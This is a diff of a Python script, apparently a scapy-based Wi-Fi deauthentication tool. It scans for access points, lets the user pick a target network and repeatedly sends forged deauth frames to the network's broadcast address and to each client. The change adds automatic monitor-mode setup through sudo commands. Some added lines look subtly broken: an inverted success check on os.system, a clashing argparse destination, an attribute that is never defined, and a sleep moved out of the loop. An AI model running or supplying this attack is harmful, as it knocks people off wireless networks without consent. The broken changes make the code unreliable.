@@ -24,15 +24,14 @@ class Interceptor:
     _BROADCAST_MACADDR = "ff:ff:ff:ff:ff:ff"
     _CH_RANGE = range(1, 12)
 
-    def __init__(self, net_iface, *args, **kwargs):
+    def __init__(self, net_iface, skip_monitor_mode_setup, *args, **kwargs):
         self.interface = net_iface
-        self._channel_sniff_timeout = 3
+        self._channel_sniff_timeout = 2
         self._max_miss_counter = 3
         self._scan_intv = 0.1
         self._deauth_intv = 0.1
         self._printf_res_intv = 1
         self._ssid_str_pad = 42  # total len 80
-        self._mac_range = 2  # todo rename
 
         self._abort = False
         self._current_channel_num = None
@@ -42,13 +41,24 @@ class Interceptor:
 
         self.target_ssid = str()
         self._active_aps = defaultdict(dict)
-        # {
-        #     ssid: {
-        #         channel: n,
-        #         mac_addr: x,
-        #         clients: []
-        #     }
-        # }
+
+        if not skip_monitor_mode_setup:
+            printf("[*] Setting up monitor mode...")
+            if not self._enable_monitor_mode():
+                printf("[!] Monitor mode was not enabled properly")
+                raise Exception("Unable to turn on monitor mode")
+            printf("[*] Monitor mode was set up successfully")
+        else:
+            printf("[*] Skipping monitor mode setup...")
+
+    def _enable_monitor_mode(self):
+        for cmd in [f"sudo ip link set {self.interface} down",
+                    f"sudo iw {self.interface} set monitor control",
+                    f"sudo ip link set {self.interface} up"]:
+            printf(f"[*] Running command > '{cmd}'")
+            if not os.system(cmd):
+                return False
+        return True
 
     def _set_channel(self, ch_num: int):
         os.system("iw dev %s set channel %d" % (self.interface, ch_num))
@@ -115,7 +125,7 @@ class Interceptor:
 
         chosen = -1
         while chosen not in target_map.keys():
-            printf(f"[>] Choose a target from {min(target_map.keys())} <-> {max(target_map.keys())}")
+            printf(f">>>>> Choose a target from {min(target_map.keys())} <-> {max(target_map.keys())}")
             chosen = int(input())
 
         return target_map[chosen]
@@ -125,7 +135,6 @@ class Interceptor:
 
     def _clients_sniff_cb(self, pkt):
         try:
-            # TODO instead:  if p.type == 0 and p.subtype in (0, 2, 4): ?
             if self._packet_confirms_client(pkt):
             # if pkt.haslayer(Dot11Elt):
                 ap_mac = str(pkt.addr3)
@@ -146,52 +155,37 @@ class Interceptor:
         printf(f"[*] Setting up a listener for new clients...")
         sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: self._abort is True)
     
-    def _generate_possible_ap_mac_addrs(self):
-        possible_mac_addrs = list()
-        original_addr = self._active_aps[self.target_ssid]["mac_addr"].split(':')
-        ap_mac_postf = original_addr[-1]
-        ap_mac_postf = int(ap_mac_postf, 16)
-        for i in range(-self._mac_range, self._mac_range):
-            new_postf = ap_mac_postf + i
-            if new_postf >= 0 and i != 0:
-                modified = copy.deepcopy(original_addr)
-                modified[-1] = hex(new_postf).replace('0x', '')
-                possible_mac_addrs.append(':'.join(modified))
-        return possible_mac_addrs
-                
     def _run_deauther(self):
         printf(f"[*] Starting de-auth loop...")
 
-        possible_ap_mac_addrs = [self._active_aps[self.target_ssid]["mac_addr"]]
-        possible_ap_mac_addrs.extend(self._generate_possible_ap_mac_addrs())  # TODO is this really needed?
-        
+        ap_mac = [self._active_aps[self.target_ssid]["mac_addr"]]
+
         rd_frm = RadioTap()
         deauth_frm = Dot11Deauth()
         while not self._abort:
             self.attack_loop_count += 1
-            for ap_mac in possible_ap_mac_addrs:
+            sendp(rd_frm /
+                  Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
+                  deauth_frm,
+                  iface=self.interface)  # todo broadcast works?
+            for client_mac in self._active_aps[self.target_ssid]["clients"]:
                 sendp(rd_frm /
-                      Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
+                      Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
                       deauth_frm,
-                      iface=self.interface)  # todo broadcast works?
-                for client_mac in self._active_aps[self.target_ssid]["clients"]:
-                    sendp(rd_frm /
-                          Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
-                          deauth_frm,
-                          iface=self.interface)
-                    sendp(rd_frm /
-                          Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
-                          deauth_frm,
-                          iface=self.interface)
-                    # sendp(rd_frm /
-                    #       Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
-                    #       deauth_frm,
-                    #       iface=self.interface)
-                    # sendp(rd_frm /
-                    #       Dot11(addr1=client_mac, addr2=self._BROADCAST_MACADDR, addr3=self._BROADCAST_MACADDR) /
-                    #       deauth_frm,
-                    #       iface=self.interface)  # todo broadcast works? beware you might disconnect the client from other networks
-            sleep(self._deauth_intv)
+                      iface=self.interface)
+                sendp(rd_frm /
+                      Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
+                      deauth_frm,
+                      iface=self.interface)
+                # sendp(rd_frm /
+                #       Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
+                #       deauth_frm,
+                #       iface=self.interface)
+                # sendp(rd_frm /
+                #       Dot11(addr1=client_mac, addr2=self._BROADCAST_MACADDR, addr3=self._BROADCAST_MACADDR) /
+                #       deauth_frm,
+                #       iface=self.interface)  # todo broadcast works? beware you might disconnect the client from other networks
+        sleep(self._deauth_intv)
 
     def run(self):
         self.target_ssid = self._start_initial_ap_scan()
@@ -231,11 +225,11 @@ class Interceptor:
 
 if __name__ == "__main__":
     printf(f"\n{BANNER}\n"
-          f"Make sure of the following:\n"
-          f"1. You are running as sudo\n"
-          f"2. You are passing an interface (-i / --iface <name>)\n"
-          f"3. You have monitor mode enabled (refer to docs)\n\n" # todo add to docs how to
-          f"Written by @flashnuke")
+           f"Make sure of the following:\n"
+           f"1. You are running as sudo\n"
+           f"2. You are passing a correct network interface (-i / --iface <name>)\n"
+           f"3. Your wireless adapter supports monitor mode (refer to docs)\n\n"  # todo add to docs how to
+           f"Written by @flashnuke")
     printf(DELIM)
 
     if "linux" not in platform:
@@ -245,12 +239,14 @@ if __name__ == "__main__":
 
     # arguments = define_args()
     parser = argparse.ArgumentParser(description='A simple program to perform a deauth attack')
-    parser.add_argument('-i', '--iface', help='a network interface with monitor mode enabled (i.e -> "eth0")', action='store',
-                        dest="net_iface", metavar="network_interface", required=True)
+    parser.add_argument('-i', '--iface', help='a network interface with monitor mode enabled (i.e -> "eth0")',
+                        action='store', dest="net_iface", metavar="network_interface", required=True)
+    parser.add_argument('-sm', '--skip-monitormode', help='skip automatic setup of monitor mode', action='store_true',
+                        dest="net_iface", default=False, metavar="skip_monitormode", required=False)
     pargs = parser.parse_args()
 
     invalidate_print()  # after arg parsing
-    attacker = Interceptor(net_iface=pargs.net_iface)
+    attacker = Interceptor(net_iface=pargs.net_iface, skip_monitor_mode_setup=pargs.skip_monitor_mode_setup)
     attacker.run()
 
 # TODO
